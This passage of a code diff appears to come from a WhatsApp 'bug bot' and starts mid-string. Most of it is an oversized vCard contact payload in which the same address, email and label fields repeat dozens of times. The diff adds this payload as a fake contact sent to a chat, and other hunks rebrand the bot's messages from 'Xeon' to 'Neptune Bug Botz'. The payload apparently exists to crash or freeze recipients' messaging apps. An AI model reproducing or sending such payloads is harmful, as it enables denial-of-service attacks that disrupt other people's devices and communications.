karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;\nEND:VCARD` }}}		
+const fakecontect = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "@broadcast" } : {})}, message: { "contactMessage":{"displayName": `☣️❖〘 ₙₑₚₜᵤₙₑ 𝔹𝕦𝕘 𝔹𝕠𝕥𝓩 〙❖☣️ ${xeonbrutal(prefix)}`,"vcard":`BEGIN:VCARD\nVERSION:3.0\nN:2;conn;;;\nFN:Neptune.exe ☣️\nitem1.TEL:+916909137213\nitem1.X-ABLabel:Celular\nitem2.EMAIL;type=INTERNET:EMAIL;CHARSET=UTF-8;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;\nEND:VCARD` }}}		
 NepBotzInc.sendContact(m.chat, global.owner, fakecontect)
 }
 }
@@ -8957,7 +8956,7 @@ case 'huehuex': {
 let user = global.db.data.users[m.sender]
 user.afkTime = + new Date
 user.afkReason = text
-reply(`🦄ᵈʳᵉᵃᵐ ᵍᵘʸ ˣᵉᵒⁿ⸙xbugbot ${m.pushName} ${text ? ': ' + text : ''}`)
+reply(`☣️❖〘 ₙₑₚₜᵤₙₑ 𝔹𝕦𝕘 𝔹𝕠𝕥𝓩 〙❖☣️ ${m.pushName} ${text ? ': ' + text : ''}`)
 }
 break
   case 'bye_bye ':{
@@ -8976,12 +8975,12 @@ participant: `0@s.whatsapp.net`,
 message: { 
 "imageMessage": { 
 "mimetype": "image/jpeg", 
-"caption": `🦄ᵈʳᵉᵃᵐ ᵍᵘʸ ˣᵉᵒⁿ⸙xbugbot`, 
+"caption": `☣️❖〘 ₙₑₚₜᵤₙₑ 𝔹𝕦𝕘 𝔹𝕠𝕥𝓩 〙❖☣️`, 
 "jpegThumbnail": thumb
 } 
 } 
 }
-NepBotzInc.sendText(m.chat, `Xeon Ezy☣️`, text, {quoted: unicornXeonxD})
+NepBotzInc.sendText(m.chat, `Neptune.exe ☣️`, text, {quoted: unicornXeonxD})
 }
 }
 break
@@ -8992,7 +8991,7 @@ case 'xeonbugtes': {
                 let user = global.db.data.users[m.sender]
                 user.afkTime = + new Date
                 user.afkReason = text
-                reply(`${m.pushName} Xeon Ezy☣️${text ? ': ' + text : ''}`)
+                reply(`${m.pushName} Neptune.exe ☣️${text ? ': ' + text : ''}`)
             }
             break
 //------------------------The End----------------------\\
